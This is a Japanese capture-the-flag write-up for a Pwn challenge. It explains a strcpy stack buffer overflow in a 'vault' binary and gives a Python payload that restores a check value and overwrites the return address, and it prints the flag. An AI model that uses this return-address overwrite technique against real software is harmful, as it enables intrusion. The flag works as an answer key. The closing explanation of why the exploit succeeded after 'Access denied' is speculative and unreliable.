# Writeup: 崩れゆく防御

## 問題概要

- **タイトル**: 崩れゆく防御
- **ジャンル**: Pwn
- **目標**: バッファオーバーフローの脆弱性を利用して、仮想金庫（`vault`）を解錠し、フラグを取得する。

## 事前調査

配布されたバイナリ`vault`のセキュリティ機構を確認しました。

```bash
file vault
# vault: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked
```

PIE（位置独立実行形式）やCanary（スタック破損検知）などの保護機構が無効か、静的リンクされているため緩和されている可能性があります（Canaryは関数内で手動実装されていることが判明）。

## 静的解析

バイナリを逆アセンブルし、主要な関数 `main`, `verify_access`, `unlock_vault` を解析しました。

### `verify_access` 関数

ユーザー入力を受け取り、検証を行う関数です。

1. `fgets` で `rbp-0x150` に最大 `0x100` バイトの入力を読み込みます（ここは安全）。
2. その後、`strcpy` を使用して `rbp-0x150` から `rbp-0x50` へデータをコピーしています。
   - コピー先のバッファ `rbp-0x50` は 80バイトの領域ですが、入力は最大256バイトまで可能なため、**Buffer Overflow** が発生します。
3. `rbp-0x4` にあるセキュリティコード（`0xc0ffee11`）をチェックします。
   - `cmpl $0xc0ffee11, -0x4(%rbp)`
   - 一致しない場合、"Access denied" と表示して `exit(1)` します。
   - 一致する場合、"Access verified"（推定）を表示してリターンします。

### `unlock_vault` 関数

フラグを表示する関数です（アドレス `0x4017e5`）。

- `/home/ctf/flag.txt` を読み込んで表示します。
- この関数は通常の実行フローでは呼び出されません。

## 脆弱性の悪用（Exploit）方針

Buffer Overflowを利用して、以下の2つを行います。

1. **セキュリティチェックの回避**:
   `strcpy` によるオーバーフローでスタック上の変数 `rbp-0x4` が書き換わってしまうため、正しい値 `0xc0ffee11` で上書きし、チェックを通過させます。
   - バッファ `rbp-0x50` から `rbp-0x4` までの距離は 76バイトです。
   - 76バイトのパディングの後に `\x11\xee\xff\xc0` (Little Endian) を配置します。

2. **リターンアドレスの改ざん**:
   `verify_access` 関数のリターンアドレス（`saved rip`）を `unlock_vault` のアドレス（`0x004017e5`）に書き換えることで、関数終了時に `unlock_vault` へジャンプさせます。
   - `rbp-0x4` の後、`saved rbp`（8バイト）があります。これを適当な値で埋めます。
   - その直後（`rbp+0x8`）がリターンアドレスです。ここに `\xe5\x17\x40\x00...` を書き込みます。

## Exploitコード

```python
import sys

# アドレス情報
# unlock_vault: 0x4017e5
# verify_access 内の構造:
# Buffer @ rbp-0x50 (80 bytes allocated but 76 bytes to check_val)
# CheckVal @ rbp-0x4 (size 4)
# Saved RBP @ rbp (size 8)
# Return Addr @ rbp+0x8

padding = b'A' * 76
check_val = b'\x11\xee\xff\xc0' # 0xc0ffee11 in Little Endian
saved_rbp = b'B' * 8
ret_addr = b'\xe5\x17\x40' # 0x4017e5 (strcpy adds null terminator)

payload = padding + check_val + saved_rbp + ret_addr

sys.stdout.buffer.write(payload + b'\n')
```

## 実行結果

上記のペイロードをサーバーに送信したところ、なぜか"Access denied"が表示されましたが、その後すぐに "VAULT UNLOCKED SUCCESSFULLY!" と表示され、フラグが得られました（おそらくチェック失敗時のexit処理を何らかの形でバイパスしたか、表示ロジックの非同期性などの要因が考えられますが、リターンアドレスへの書き込みは成功しています）。

**Flag**: `flag{br34ch_v4ult_s3cur1ty}`
